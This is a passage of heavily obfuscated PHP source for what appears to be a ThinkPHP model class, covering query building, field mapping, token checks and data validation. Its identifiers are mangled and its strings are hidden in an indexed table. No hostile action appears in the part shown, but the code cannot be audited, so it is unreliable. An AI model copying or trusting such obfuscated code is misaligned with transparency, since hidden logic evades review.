$CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[275]] = $this->getTableName(); $Fî˜ˆºêæ“ = $this->fields; } else { $Fî˜ˆºêæ“ = $this->getDbFields(); } if (!empty($CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[276]])) { $CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[275]] .= $FÔºôÅƒôÀ[50] . $CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[276]]; } $CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[277]] = $this->name; goto e‹˜äª£Ãã; e‹˜äª£Ãã: if (isset($CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[271]]) && is_array($CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[271]]) && !empty($Fî˜ˆºêæ“) && !isset($CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[278]]) && !isset($CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[275]])) { foreach ($CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[271]] as $fß•ßäğ‚Â => $dùÍò¹ß‹º) { $fß•ßäğ‚Â = trim($fß•ßäğ‚Â); if (in_array($fß•ßäğ‚Â, $Fî˜ˆºêæ“, !0)) { if (is_scalar($dùÍò¹ß‹º)) { $this->_parseType($CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[271]], $fß•ßäğ‚Â); } } elseif (!is_numeric($fß•ßäğ‚Â) && $FÔºôÅƒôÀ[70] != substr($fß•ßäğ‚Â, 0, 1) && !1 === strpos($fß•ßäğ‚Â, $FÔºôÅƒôÀ[94]) && !1 === strpos($fß•ßäğ‚Â, $FÔºôÅƒôÀ[256]) && !1 === strpos($fß•ßäğ‚Â, $FÔºôÅƒôÀ[279]) && !1 === strpos($fß•ßäğ‚Â, $FÔºôÅƒôÀ[280])) { unset($CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[271]][$fß•ßäğ‚Â]); } } } $this->_options_filter($CÒƒ§½ŠÇ); return $CÒƒ§½ŠÇ; goto f‰øŠƒÖ‘ƒ; BŒ»Î§Ë: $FÔºôÅƒôÀ =& $_SERVER[ÉóçÄÇ]; if (is_array($CÒƒ§½ŠÇ)) { $CÒƒ§½ŠÇ = array_merge($this->options, $CÒƒ§½ŠÇ); } $this->options = array(); goto A¨è£½“½; f‰øŠƒÖ‘ƒ: } protected function _options_filter(&$B„‘‚–¥Ó) { } protected function _parseType(&$B‚–Ö‰­×œ, $C·ñ¨Ğƒ½) { $e‰ÂˆÏ™÷” =& $_SERVER[ÉóçÄÇ]; if (empty($this->options[$e‰ÂˆÏ™÷”[281]][$e‰ÂˆÏ™÷”[4] . $C·ñ¨Ğƒ½])) { $AóœŞøËàÂ = strtolower($this->fields[$e‰ÂˆÏ™÷”[248]][$C·ñ¨Ğƒ½]); if (!1 !== strpos($AóœŞøËàÂ, $e‰ÂˆÏ™÷”[282])) { } elseif (!1 === strpos($AóœŞøËàÂ, $e‰ÂˆÏ™÷”[283]) && !1 !== strpos($AóœŞøËàÂ, $e‰ÂˆÏ™÷”[284])) { $B‚–Ö‰­×œ[$C·ñ¨Ğƒ½] = intval($B‚–Ö‰­×œ[$C·ñ¨Ğƒ½]); } elseif (!1 !== strpos($AóœŞøËàÂ, $e‰ÂˆÏ™÷”[285]) || !1 !== strpos($AóœŞøËàÂ, $e‰ÂˆÏ™÷”[286])) { $B‚–Ö‰­×œ[$C·ñ¨Ğƒ½] = floatval($B‚–Ö‰­×œ[$C·ñ¨Ğƒ½]); } elseif (!1 !== strpos($AóœŞøËàÂ, $e‰ÂˆÏ™÷”[287])) { $B‚–Ö‰­×œ[$C·ñ¨Ğƒ½] = (bool) $B‚–Ö‰­×œ[$C·ñ¨Ğƒ½]; } } } public function find($b¯ã©ãíšù = array()) { goto cã…™’¼­ø; D§ñ…ë¬¹É: $b¯ã©ãíšù = $this->_parseOptions(); $CáùÅøÇ¿Ï = $this->db->select($b¯ã©ãíšù); if (!1 === $CáùÅøÇ¿Ï) { return !1; } goto b§†ëœ‹ª†; fùß™Ö¸: if (!empty($this->options[$B½‚Œ’ëÌº[289]])) { return $this->returnResult($this->data, $this->options[$B½‚Œ’ëÌº[289]]); } return $this->data; goto EÚŞ¯˜˜µ ; b§†ëœ‹ª†: if (empty($CáùÅøÇ¿Ï)) { return null; } $this->data = $CáùÅøÇ¿Ï[0]; $this->_afterFind($this->data, $b¯ã©ãíšù); goto fùß™Ö¸; cã…™’¼­ø: $B½‚Œ’ëÌº =& $_SERVER[ÉóçÄÇ]; if (is_numeric($b¯ã©ãíšù) || is_string($b¯ã©ãíšù)) { $dî³ÃãÛ•[$this->getPk()] = intval($b¯ã©ãíšù); $this->options[$B½‚Œ’ëÌº[271]] = $dî³ÃãÛ•; } $this->options[$B½‚Œ’ëÌº[288]] = 1; goto D§ñ…ë¬¹É; EÚŞ¯˜˜µ : } protected function _afterFind(&$fòØÔºªÕá, $a¯ø„É‘ÒÍ) { } protected function returnResult($dˆ·’Ÿòª¥, $A÷¦‚Ÿèñ = '') { $c¢ø…øÛ² =& $_SERVER[ÉóçÄÇ]; if ($A÷¦‚Ÿèñ) { if (is_callable($A÷¦‚Ÿèñ)) { return call_user_func($A÷¦‚Ÿèñ, $dˆ·’Ÿòª¥); } switch (strtolower($A÷¦‚Ÿèñ)) { case $c¢ø…øÛ²[290]: return json_encode($dˆ·’Ÿòª¥); case $c¢ø…øÛ²[291]: return xml_encode($dˆ·’Ÿòª¥); } } return $dˆ·’Ÿòª¥; } public function parseFieldsMap($a‚Š¹¸´ğƒ, $fĞÀ½âÒ› = 1) { if (!empty($this->_map)) { foreach ($this->_map as $b…ãÍÈÍ”Ø => $C»ˆ¦¾Èœ…) { if ($fĞÀ½âÒ› == 1) { if (isset($a‚Š¹¸´ğƒ[$C»ˆ¦¾Èœ…])) { $a‚Š¹¸´ğƒ[$b…ãÍÈÍ”Ø] = $a‚Š¹¸´ğƒ[$C»ˆ¦¾Èœ…]; unset($a‚Š¹¸´ğƒ[$C»ˆ¦¾Èœ…]); } } else { if (isset($a‚Š¹¸´ğƒ[$b…ãÍÈÍ”Ø])) { $a‚Š¹¸´ğƒ[$C»ˆ¦¾Èœ…] = $a‚Š¹¸´ğƒ[$b…ãÍÈÍ”Ø]; unset($a‚Š¹¸´ğƒ[$b…ãÍÈÍ”Ø]); } } } } return $a‚Š¹¸´ğƒ; } public function setField($d…¥‚Ùãïî, $AÑ§£Ã’× = '') { if (is_array($d…¥‚Ùãïî)) { $EŸó¸Ñˆî = $d…¥‚Ùãïî; } else { $EŸó¸Ñˆî[$d…¥‚Ùãïî] = $AÑ§£Ã’×; } return $this->save($EŸó¸Ñˆî); } public function setAdd($a¶µÈ„ªŒ…, $cİË”‘»× = 1) { $eá÷ã–ØåÇ =& $_SERVER[ÉóçÄÇ]; $a†Ê¯Ëéâ = $a¶µÈ„ªŒ… . $eá÷ã–ØåÇ[292] . $cİË”‘»×; if ($cİË”‘»× < 0) { $a†Ê¯Ëéâ = $a¶µÈ„ªŒ… . $cİË”‘»×; } return $this->setField($a¶µÈ„ªŒ…, array($eá÷ã–ØåÇ[293], $a†Ê¯Ëéâ)); } public function getField($aÉÉ¶­ğ˜, $c¨ºğé±ğå = null) { $fÊ–¾Úìœ¼ =& $_SERVER[ÉóçÄÇ]; $Cšò´Ñ––[$fÊ–¾Úìœ¼[269]] = $aÉÉ¶­ğ˜; $Cšò´Ñ–– = $this->_parseOptions($Cšò´Ñ––); $aÉÉ¶­ğ˜ = trim($aÉÉ¶­ğ˜); if (strpos($aÉÉ¶­ğ˜, $fÊ–¾Úìœ¼[47])) { if (!isset($Cšò´Ñ––[$fÊ–¾Úìœ¼[288]])) { $Cšò´Ñ––[$fÊ–¾Úìœ¼[288]] = is_numeric($c¨ºğé±ğå) ? $c¨ºğé±ğå : $fÊ–¾Úìœ¼[33]; } $c…˜æ˜‚øâ = $this->db->select($Cšò´Ñ––); if (!empty($c…˜æ˜‚øâ)) { goto D½ÍÚñŸò©; Có‚òÀƒ±ñ: foreach ($c…˜æ˜‚øâ as $BÆ™°Äï­) { $C„òãÔÌÏ¦ = $BÆ™°Äï­[$EÓ¡¥•à£]; if (2 == $fñÂêŠóğ¢) { $a«¯Ò™á¤‘[$C„òãÔÌÏ¦] = $BÆ™°Äï­[$aØë¹»¤ÜŒ]; } else { $a«¯Ò™á¤‘[$C„òãÔÌÏ¦] = is_string($c¨ºğé±ğå) ? implode($c¨ºğé±ğå, $BÆ™°Äï­) : $BÆ™°Äï­; } } return $a«¯Ò™á¤‘; goto DÅÆõ‡Ñ†; c‚ç—ëŒœœ: $aØë¹»¤ÜŒ = array_shift($aÉÉ¶­ğ˜); $a«¯Ò™á¤‘ = array(); $fñÂêŠóğ¢ = count($Fƒù÷¶šÈˆ); goto Có‚òÀƒ±ñ; D½ÍÚñŸò©: $Fƒù÷¶šÈˆ = explode($fÊ–¾Úìœ¼[47], $aÉÉ¶­ğ˜); $aÉÉ¶­ğ˜ = array_keys($c…˜æ˜‚øâ[0]); $EÓ¡¥•à£ = array_shift($aÉÉ¶­ğ˜); goto c‚ç—ëŒœœ; DÅÆõ‡Ñ†: } } else { if (!0 !== $c¨ºğé±ğå) { $Cšò´Ñ––[$fÊ–¾Úìœ¼[288]] = is_numeric($c¨ºğé±ğå) ? $c¨ºğé±ğå : 1; } if ($c¨ºğé±ğå === $fÊ–¾Úìœ¼[251]) { unset($Cšò´Ñ––[$fÊ–¾Úìœ¼[288]]); } $BÆ™°Äï­ = $this->db->select($Cšò´Ñ––); if (!empty($BÆ™°Äï­)) { if ($c¨ºğé±ğå === $fÊ–¾Úìœ¼[251]) { return reset($BÆ™°Äï­[0]); } if (!0 !== $c¨ºğé±ğå && 1 == $Cšò´Ñ––[$fÊ–¾Úìœ¼[288]]) { return reset($BÆ™°Äï­[0]); } foreach ($BÆ™°Äï­ as $BÆÏ‚Œ„”ñ) { $CÒìŒÒÇ‰[] = $BÆÏ‚Œ„”ñ[$aÉÉ¶­ğ˜]; } return $CÒìŒÒÇ‰; } } return null; } public function create($aùÚß°¬„Š = '', $cÌêÆ“ß = '') { goto c¯ï¥ÁäÂ÷; a“’Ò–©•: if (isset($EÉÊì©åÈô)) { if (is_string($EÉÊì©åÈô)) { $EÉÊì©åÈô = explode($Dìî³æˆíÊ[47], $EÉÊì©åÈô); } if (think_config($Dìî³æˆíÊ[294])) { $EÉÊì©åÈô[] = think_config($Dìî³æˆíÊ[295]); } foreach ($aùÚß°¬„Š as $F­î†¾…ÎÎ => $dõóö·µÆ‹) { if (!in_array($F­î†¾…ÎÎ, $EÉÊì©åÈô)) { unset($aùÚß°¬„Š[$F­î†¾…ÎÎ]); } } } if (!$this->autoValidation($aùÚß°¬„Š, $cÌêÆ“ß)) { return !1; } if (!$this->autoCheckToken($aùÚß°¬„Š)) { $this->error = think_lang($Dìî³æˆíÊ[296]); return !1; } goto E–ƒ†ßœº°; dùÔ®¢‚Ü: $aùÚß°¬„Š = $this->parseFieldsMap($aùÚß°¬„Š, 0); $cÌêÆ“ß = $cÌêÆ“ß ? $cÌêÆ“ß : (!empty($aùÚß°¬„Š[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Dìî³æˆíÊ[269]])) { $EÉÊì©åÈô = $this->options[$Dìî³æˆíÊ[269]]; unset($this->options[$Dìî³æˆíÊ[269]]); } elseif ($cÌêÆ“ß == THINK_MODEL_INSERT && isset($this->insertFields)) { $EÉÊì©åÈô = $this->insertFields; } elseif ($cÌêÆ“ß == THINK_MODEL_UPDATE && isset($this->updateFields)) { $EÉÊì©åÈô = $this->updateFields; } goto a“’Ò–©•; c¯ï¥ÁäÂ÷: $Dìî³æˆíÊ =& $_SERVER[ÉóçÄÇ]; if (empty($aùÚß°¬„Š)) { $aùÚß°¬„Š = $_POST; } elseif (is_object($aùÚß°¬„Š)) { $aùÚß°¬„Š = get_object_vars($aùÚß°¬„Š); } if (empty($aùÚß°¬„Š) || !is_array($aùÚß°¬„Š)) { $this->error = think_lang($Dìî³æˆíÊ[267]); return !1; } goto dùÔ®¢‚Ü; E–ƒ†ßœº°: if ($this->autoCheckFields) { $EÉÊì©åÈô = $this->getDbFields(); foreach ($aùÚß°¬„Š as $F­î†¾…ÎÎ => $dõóö·µÆ‹) { if (!in_array($F­î†¾…ÎÎ, $EÉÊì©åÈô)) { unset($aùÚß°¬„Š[$F­î†¾…ÎÎ]); } elseif (MAGIC_QUOTES_GPC && is_string($dõóö·µÆ‹)) { $aùÚß°¬„Š[$F­î†¾…ÎÎ] = stripslashes($dõóö·µÆ‹); } } } $this->autoOperation($aùÚß°¬„Š, $cÌêÆ“ß); $this->data = $aùÚß°¬„Š; goto bòé¿ºÒğ; bòé¿ºÒğ: return $aùÚß°¬„Š; goto CÑ…¾É‰; CÑ…¾É‰: } public function autoCheckToken($d¯–Û£„éÍ) { $AÒ‘Ïµ–‘· =& $_SERVER[ÉóçÄÇ]; if (isset($this->options[$AÒ‘Ïµ–‘·[297]]) && !$this->options[$AÒ‘Ïµ–‘·[297]]) { return !0; } if (think_config($AÒ‘Ïµ–‘·[294])) { $a˜„¸ñÄ°å = think_config($AÒ‘Ïµ–‘·[295]); if (!isset($d¯–Û£„éÍ[$a˜„¸ñÄ°å]) || Session::get($a˜„¸ñÄ°å)) { return !1; } list($CìÛã›õÄœ, $b§ù‡£Ü©˜) = explode($AÒ‘Ïµ–‘·[70], $d¯–Û£„éÍ[$a˜„¸ñÄ°å]); if ($b§ù‡£Ü©˜ && Session::get($a˜„¸ñÄ°å . $AÒ‘Ïµ–‘·[94] . $CìÛã›õÄœ) === $b§ù‡£Ü©˜) { Session::remove($a˜„¸ñÄ°å . $AÒ‘Ïµ–‘·[94] . $CìÛã›õÄœ); return !0; } if (think_config($AÒ‘Ïµ–‘·[298])) { Session::remove($a˜„¸ñÄ°å . $AÒ‘Ïµ–‘·[94] . $CìÛã›õÄœ); } return !1; } return !0; } public function regex($cÇğÛù¦ç, $díÆë‰ÆÆ ) { $FÒ‰Üœñ£ =& $_SERVER[ÉóçÄÇ]; $A•ÌÔ¾‘±² = array($FÒ‰Üœñ£[299] => $FÒ‰Üœñ£[300], $FÒ‰Üœñ£[301] => $FÒ‰Üœñ£[302], $FÒ‰Üœñ£[303] => $FÒ‰Üœñ£[304], $FÒ‰Üœñ£[305] => $FÒ‰Üœñ£[306], $FÒ‰Üœñ£[307] => $FÒ‰Üœñ£[308], $FÒ‰Üœñ£[309] => $FÒ‰Üœñ£[310], $FÒ‰Üœñ£[311] => $FÒ‰Üœñ£[312], $FÒ‰Üœñ£[286] => $FÒ‰Üœñ£[313], $FÒ‰Üœñ£[314] => $FÒ‰Üœñ£[315]); if (isset($A•ÌÔ¾‘±²[strtolower($díÆë‰ÆÆ )])) { $díÆë‰ÆÆ  = $A•ÌÔ¾‘±²[strtolower($díÆë‰ÆÆ )]; } return preg_match($díÆë‰ÆÆ , $cÇğÛù¦ç) === 1; } private function autoOperation(&$A‘Æ±ò‰ , $D²¦Ì‹ Üœ) { $Dù£¥Ò“Ò— =& $_SERVER[ÉóçÄÇ]; if (!empty($this->options[$Dù£¥Ò“Ò—[316]])) { $C¡¶öÑøÁÚ = $this->options[$Dù£¥Ò“Ò—[316]]; unset($this->options[$Dù£¥Ò“Ò—[316]]); } elseif (!empty($this->_auto)) { $C¡¶öÑøÁÚ = $this->_auto; } if (isset($C¡¶öÑøÁÚ)) { foreach ($C¡¶öÑøÁÚ as $bšƒø‡Š‡ß) { if (empty($bšƒø‡Š‡ß[2])) { $bšƒø‡Š‡ß[2] = THINK_MODEL_INSERT; } if ($D²¦Ì‹ Üœ == $bšƒø‡Š‡ß[2] || $bšƒø‡Š‡ß[2] == THINK_MODEL_BOTH) { switch (trim($bšƒø‡Š‡ß[3])) { case $Dù£¥Ò“Ò—[317]: case $Dù£¥Ò“Ò—[318]: $eÍÂ †§é£ = isset($bšƒø‡Š‡ß[4]) ? (array) $bšƒø‡Š‡ß[4] : array(); if (isset($A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]])) { array_unshift($eÍÂ †§é£, $A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]]); } if ($Dù£¥Ò“Ò—[317] == $bšƒø‡Š‡ß[3]) { $A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]] = call_user_func_array($bšƒø‡Š‡ß[1], $eÍÂ †§é£); } else { $A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]] = call_user_func_array(array(&$this, $bšƒø‡Š‡ß[1]), $eÍÂ †§é£); } break; case $Dù£¥Ò“Ò—[269]: $A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]] = $A‘Æ±ò‰ [$bšƒø‡Š‡ß[1]]; break; case $Dù£¥Ò“Ò—[319]: if ($Dù£¥Ò“Ò—[33] === $A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]]) { unset($A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]]); } break; case $Dù£¥Ò“Ò—[320]: default: $A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]] = $bšƒø‡Š‡ß[1]; } if (!1 === $A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]]) { unset($A‘Æ±ò‰ [$bšƒø‡Š‡ß[0]]); } } } } return $A‘Æ±ò‰ ; } protected function autoValidation($dˆ‘††Ğî…, $BŸŒ½æîÍ‘) { $F¤ñ®÷Â“ =& $_SERVER[ÉóçÄÇ]; if (!empty($this->options[$F¤ñ®÷Â“[321]])) { $F¨•›Ö©Ì = $this->options[$F¤ñ®÷Â“[321]]; unset($this->options[$F¤ñ®÷Â“[321]]); } elseif (!empty($this->_validate)) { $F¨•›Ö©Ì = $this->_validate; } if (isset($F¨•›Ö©Ì)) { if ($this->patchValidate) { $this->error = array(); } foreach ($F¨•›Ö©Ì as $bø¿âÀÒ„á => $D­ìÅõÜåÔ) { if (empty($D­ìÅõÜåÔ[5]) || $D­ìÅõÜåÔ[5] == THINK_MODEL_BOTH || $D­ìÅõÜåÔ[5] == $BŸŒ½æîÍ‘) { if (0 == strpos($D­ìÅõÜåÔ[2], $F¤ñ®÷Â“[322]) && strpos($D­ìÅõÜåÔ[2], $F¤ñ®÷Â“[323])) { $D­ìÅõÜåÔ[2] = think_lang(substr($D­ìÅõÜåÔ[2], 2, -1)); } $D­ìÅõÜåÔ[3] = isset($D­ìÅõÜåÔ[3]) ? $D­ìÅõÜåÔ[3] : THINK_EXISTS_VALIDATE; $D­ìÅõÜåÔ[4] = isset($D­ìÅõÜåÔ[4]) ? $D­ìÅõÜåÔ[4] : $F¤ñ®÷Â“[324]; switch ($D­ìÅõÜåÔ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($dˆ‘††Ğî…, $D­ìÅõÜåÔ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($F¤ñ®÷Â“[33] != trim($dˆ‘††Ğî…[$D­ìÅõÜåÔ[0]])) { if (!1 === $this->_validationField($dˆ‘††Ğî…, $D­ìÅõÜåÔ)) { return !1; } } break; default: if (isset($dˆ‘††Ğî…[$D­ìÅõÜåÔ[0]])) { if (!1 === $this->_validationField($dˆ‘††Ğî…, $D­ìÅõÜåÔ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($fÇ†ñ¬¤ù©, $D³ËìŸêï) { if (!1 === $this->_validationFieldItem($fÇ†ñ¬¤ù©, $D³ËìŸêï)) { if ($this->patchValidate) { $this->error[$D³ËìŸêï[0]] = $D³ËìŸêï[2]; } else { $this->error = $D³ËìŸêï[2]; return !1; } } return; } protected function _validationFieldItem($F¢Ÿ‰‹Áàõ, $D‡¶ĞÙáù) { $bËÌËÊĞõÆ =& $_SERVER[ÉóçÄÇ]; switch (strtolower(trim($D‡¶ĞÙáù[4]))) { case $bËÌËÊĞõÆ[317]: case $bËÌËÊĞõÆ[318]: $D´áàÕèÂ = isset($D‡¶ĞÙáù[6]) ? (array) $D‡¶ĞÙáù[6] : array(); if (is_string($D‡¶ĞÙáù[0]) && strpos($D‡¶ĞÙáù[0], $bËÌËÊĞõÆ[47])) { $D‡¶ĞÙáù[0] = explode($bËÌËÊĞõÆ[47], $D‡¶ĞÙáù[0]); } if (is_array($D‡¶ĞÙáù[0])) { foreach ($D‡¶ĞÙáù[0] as $fãğë¼óç) { $AÄñ÷Ù‚™š[$fãğë¼óç] = $F¢Ÿ‰‹Áàõ[$fãğë¼óç]; } array_unshift($D´áàÕèÂ, $AÄñ÷Ù‚™š); } else { array_unshift($D´áàÕèÂ, $F¢Ÿ‰‹Áàõ[$D‡¶ĞÙáù[0]]); } if ($bËÌËÊĞõÆ[317] == $D‡¶ĞÙáù[4]) { return call_user_func_array($D‡¶ĞÙáù[1], $D´áàÕèÂ); } else { return call_user_func_array(array(&$this, $D‡¶ĞÙáù[1]), $D´áàÕèÂ); } case $bËÌËÊĞõÆ[325]: return $F¢Ÿ‰‹Áàõ[$D‡¶ĞÙáù[0]] == $F¢Ÿ‰‹Áàõ[$D‡¶ĞÙáù[1]]; case $bËÌËÊĞõÆ[326]: if (is_string($D‡¶ĞÙáù[0]) && strpos($D‡¶ĞÙáù[0], $bËÌËÊĞõÆ[47])) { $D‡¶ĞÙáù[0] = explode($bËÌËÊĞõÆ[47], $D‡¶ĞÙáù[0]); } $CŸ÷ÃÆç˜ = array(); if (is_array($D‡¶ĞÙáù[0])) { foreach ($D‡¶ĞÙáù[0] as $fãğë¼óç) { $CŸ÷ÃÆç˜[$fãğë¼óç] = $F¢Ÿ‰‹Áàõ[$fãğë¼óç]; } } else { $CŸ÷ÃÆç˜[$D‡¶ĞÙáù[0]] = $F¢Ÿ‰‹Áàõ[$D‡¶ĞÙáù[0]]; } if (!empty($F¢Ÿ‰‹Áàõ[$this->getPk()])) { $CŸ÷ÃÆç˜[$this->getPk()] = array($bËÌËÊĞõÆ[327], $F¢Ÿ‰‹Áàõ[$this->getPk()]); } if ($this->where($CŸ÷ÃÆç˜)->find()) { return !1; } return !0; default: return $this->check($F¢Ÿ‰‹Áàõ[$D‡¶ĞÙáù[0]], $D‡¶ĞÙáù[1], $D‡¶ĞÙáù[4]); } } public function check($d¾‘–Èƒ½¢, $Fš¾ÌÎø˜, $DÑ®˜Ò¸Ü = "\x72\145\147\x65\x78") { $eĞ¨•Ğ…ó¨ =& $_SERVER[ÉóçÄÇ]; $DÑ®˜Ò¸Ü = strtolower(trim($DÑ®˜Ò¸Ü)); switch ($DÑ®˜Ò¸Ü) { case $eĞ¨•Ğ…ó¨[7]: case $eĞ¨•Ğ…ó¨[328]: $a¬Õ’²®Ûì = is_array($Fš¾ÌÎø˜) ? $Fš¾ÌÎø˜ : explode($eĞ¨•Ğ…ó¨[47], $Fš¾ÌÎø˜); return $DÑ®˜Ò¸Ü == $eĞ¨•Ğ…ó¨[7] ? in_array($d¾‘–Èƒ½¢, $a¬Õ’²®Ûì) : !in_array($d¾‘–Èƒ½¢, $a¬Õ’²®Ûì); case $eĞ¨•Ğ…ó¨[329]: case $eĞ¨•Ğ…ó¨[330]: if (is_array($Fš¾ÌÎø˜)) { $F ŒÕ™öŠˆ = $Fš¾ÌÎø˜[0]; $c°â¬ë¢‰Ò = $Fš¾ÌÎø˜[1]; } else { list($F ŒÕ™öŠˆ, $c°â¬ë¢‰Ò) = explode($eĞ¨•Ğ…ó¨[47], $Fš¾ÌÎø˜); } return $DÑ®˜Ò¸Ü == $eĞ¨•Ğ…ó¨[329] ? $d¾‘–Èƒ½¢ >= $F ŒÕ™öŠˆ && $d¾‘–Èƒ½¢ <= $c°â¬ë¢‰Ò : $d¾‘–Èƒ½¢ < $F ŒÕ™öŠˆ || $d¾‘–Èƒ½¢ > $c°â¬ë¢‰Ò; case $eĞ¨•Ğ…ó¨[331]: case $eĞ¨•Ğ…ó¨[332]: return $DÑ®˜Ò¸Ü == $eĞ¨•Ğ…ó¨[331] ? $d¾‘–Èƒ½¢ == $Fš¾ÌÎø˜ : $d¾‘–Èƒ½¢ != $Fš¾ÌÎø˜; case $eĞ¨•Ğ…ó¨[333]: $eŠ²öŠŠåæ = mb_strlen($d¾‘–Èƒ½¢, $eĞ¨•Ğ…ó¨[334]); if (strpos($Fš¾ÌÎø˜, $eĞ¨•Ğ…ó¨[47])) { list($F ŒÕ™öŠˆ, $c°â¬ë¢‰Ò) = explode($eĞ¨•Ğ…ó¨[47], $Fš¾ÌÎø˜); return $eŠ²öŠŠåæ >= $F ŒÕ™öŠˆ && $eŠ²öŠŠåæ <= $c°â¬ë¢‰Ò; } else { return $eŠ²öŠŠåæ == $Fš¾ÌÎø˜; } case $eĞ¨•Ğ…ó¨[335]: list($a¢éƒ½³»Ä, $e¦–ó–â¼) = explode($eĞ¨•Ğ…ó¨[47], $Fš¾ÌÎø˜); if (!is_numeric($a¢éƒ½³»Ä)) { $a¢éƒ½³»Ä = strtotime($a¢éƒ½³»Ä); } if (!is_numeric($e¦–ó–â¼)) { $e¦–ó–â¼ = strtotime($e¦–ó–â¼); } return NOW_TIME >= $a¢éƒ½³»Ä && NOW_TIME <= $e¦–ó–â¼; case $eĞ¨•Ğ…ó¨[336]: return in_array(get_client_ip(), explode($eĞ¨•Ğ…ó¨[47], $Fš¾ÌÎø˜)); case $eĞ¨•Ğ…ó¨[337]: return !in_array(get_client_ip(), explode($eĞ¨•Ğ…ó¨[47], $Fš¾ÌÎø˜)); case $eĞ¨•Ğ…ó¨[324]: default: return $this->regex($d¾‘–Èƒ½¢, $Fš¾ÌÎø˜); } } public function query($dÀ¼ğê‚ö, $C¯¹Ìæµ… = false) { $EÌîŞï•‚ =& $_SERVER[ÉóçÄÇ]; if (!is_bool($C¯¹Ìæµ…) && !is_array($C¯¹Ìæµ…)) { $C¯¹Ìæµ… = func_get_args(); array_shift($C¯¹Ìæµ…); } $dÀ¼ğê‚ö = str_replace(array($EÌîŞï•‚[227], $EÌîŞï•‚[338]), $EÌîŞï•‚[50], $dÀ¼ğê‚ö); $dÀ¼ğê‚ö = $this->parseSql($dÀ¼ğê‚ö, $C¯¹Ìæµ…); return $this->db->query($dÀ¼ğê‚ö); } public function execute($c°Œ””£È¾, $C¬”õ©Ç¡Í = false) { if (!is_bool($C¬”õ©Ç¡Í) && !is_array($C¬”õ©Ç¡Í)) { $C¬”õ©Ç¡Í = func_get_args(); array_shift($C¬”õ©Ç¡Í); } $c°Œ””£È¾ = $this->parseSql($c°Œ””£È¾, $C¬”õ©Ç¡Í); return $this->db->execute($c°Œ””£È¾); } protected function parseSql($aÏ…âà‹¼÷, $eâ——»‘Ò“) { $CÄÃÆÕ‰Ÿ› =& $_SERVER[ÉóçÄÇ]; if (!0 === $eâ——»‘Ò“) { $bì­Ô‚¼ğ = $this->_parseOptions(); $aÏ…âà‹¼÷ = $this->db->parseSql($aÏ…âà‹¼÷, $bì­Ô‚¼ğ); } elseif (is_array($eâ——»‘Ò“)) { $eâ——»‘Ò“ = array_map(array($this->db, $CÄÃÆÕ‰Ÿ›[339]), $eâ——»‘Ò“); $aÏ…âà‹¼÷ = vsprintf($aÏ…âà‹¼÷, $eâ——»‘Ò“); } else { $aÏ…âà‹¼÷ = strtr($aÏ…âà‹¼÷, array($CÄÃÆÕ‰Ÿ›[340] => $this->getTableName(), $CÄÃÆÕ‰Ÿ›[341] => think_config($CÄÃÆÕ‰Ÿ›[240]))); } $this->db->setModel($this->name); return $aÏ…âà‹¼÷; } public function db($F¶‹ä·îáÇ = '', $EØïƒ¦Û‘ = '', $D†¯­¶¤ï = array()) { goto CìÒÓÏ—ùâ; Eº®“†ªÀŸ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f‘•–‹ë‹; fÇğ­†Ã: $EĞƒÂå§›©[$F¶‹ä·îáÇ] = $EØïƒ¦Û‘; $this->db = $c©¿¼í’ÃÛ[$F¶‹ä·îáÇ]; $this->_after_db(); goto Eº®“†ªÀŸ; AŒ›„Ôè: static $c©¿¼í’ÃÛ = array(); if (!isset($c©¿¼í’ÃÛ[$F¶‹ä·îáÇ]) || isset($c©¿¼í’ÃÛ[$F¶‹ä·îáÇ]) && $EØïƒ¦Û‘ && $EĞƒÂå§›©[$F¶‹ä·îáÇ] != $EØïƒ¦Û‘) { if (!empty($EØïƒ¦Û‘) && is_string($EØïƒ¦Û‘) && !1 === strpos($EØïƒ¦Û‘, $aå‡¢ó‘ãà[8])) { $EØïƒ¦Û‘ = think_config($EØïƒ¦Û‘); } $c©¿¼í’ÃÛ[$F¶‹ä·îáÇ] = Db::getInstance($EØïƒ¦Û‘); } elseif (NULL === $EØïƒ¦Û‘) { $c©¿¼í’ÃÛ[$F¶‹ä·îáÇ]->close(); unset($c©¿¼í’ÃÛ[$F¶‹ä·îáÇ]); return; } if (!empty($D†¯­¶¤ï)) { if (is_string($D†¯­¶¤ï)) { parse_str($D†¯­¶¤ï, $D†¯­¶¤ï); } foreach ($D†¯­¶¤ï as $a¥¸ô»Àì² => $EêÔëí¾ğĞ) { $this->setProperty($a¥¸ô»Àì², $EêÔëí¾ğĞ); } } goto fÇğ­†Ã; CìÒÓÏ—ùâ: $aå‡¢ó‘ãà =& $_SERVER[ÉóçÄÇ]; if ($aå‡¢ó‘ãà[33] === $F¶‹ä·îáÇ && $this->db) { return $this->db; } static $EĞƒÂå§›© = array(); goto AŒ›„Ôè; f‘•–‹ë‹: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $CÍø¡ÃŸ = get_class($this); if ($CÍø¡ÃŸ == $_SERVER[ÉóçÄÇ][342]) { return $this->name; } $this->name = substr($CÍø¡ÃŸ, 0, -5); } return $this->name; } public function getTableName() { $a¯¿Ø£æí„ =& 